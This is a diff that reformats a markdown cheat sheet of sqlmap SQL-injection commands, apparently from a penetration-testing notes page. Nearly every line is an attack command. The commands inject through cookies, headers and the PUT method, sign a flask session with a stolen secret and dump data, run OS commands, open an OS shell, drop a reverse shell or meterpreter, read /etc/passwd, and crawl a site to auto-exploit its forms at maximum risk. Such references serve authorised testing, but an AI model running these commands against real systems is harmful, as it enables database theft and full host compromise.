@@ -56,66 +56,67 @@ Internal
 # Inside cookie
 -   sqlmap  -u "http://example.com" --cookie "mycookies=*"
 
-#Inside some header
-sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
-sqlmap -u "http://example.com" --headers="referer:*"
+## Inside some header
+-  sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
+-  sqlmap -u "http://example.com" --headers="referer:*"
 
-#PUT Method
-sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
-#The injection is located at the '*'
-
-
+## PUT Method
+-  sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
+-  <!--The injection is located at the '*'-->
 
 
 
-Indicate string when injection is successful
---string="string_showed_when_TRUE" 
 
 
-Eval
+## Indicate string when injection is successful
+-  --string="string_showed_when_TRUE" 
+
+
+## Eval
 Sqlmap allows the use of -e or --eval to process each payload before sending it with some python oneliner. This makes very easy and fast to process in custom ways the payload before sending it. In the following example the flask cookie session is signed by flask with the known secret before sending it:
-sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
+-  sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
 
 
 
-Shell
-#Exec command
-python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami
+## Shell
+# Exec command
+-  python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami
 
-#Simple Shell
-python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell
+# Simple Shell
+-  python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell
 
-#Dropping a reverse-shell / meterpreter
-python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
-
-
-
-Read File
---file-read=/etc/passwd
+# Dropping a reverse-shell / meterpreter
+-  python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
 
 
-Crawl a website with SQLmap and auto-exploit ->
-sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
 
---batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
---crawl = how deep you want to crawl a site
---forms = Parse and test forms
+# Read File
+-  --file-read=/etc/passwd
 
 
-Second Order Injection
-python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
-sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
+## Crawl a website with SQLmap and auto-exploit ->
+-  sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
+
+-  --batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
+-  --crawl = how deep you want to crawl a site
+-  --forms = Parse and test forms
 
 
-Set a suffix
-python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
+## Second Order Injection
+-  python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
+-  sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 
 
-Prefix
-python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
+
+## Set a suffix
+-  python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 
 
-Help finding boolean injection
+## Prefix
+-  python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
+
+
+## Help finding boolean injection
 # The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
-sqlmap -r r.txt -p id --not-string ridiculous --batch
+-  sqlmap -r r.txt -p id --not-string ridiculous --batch
 
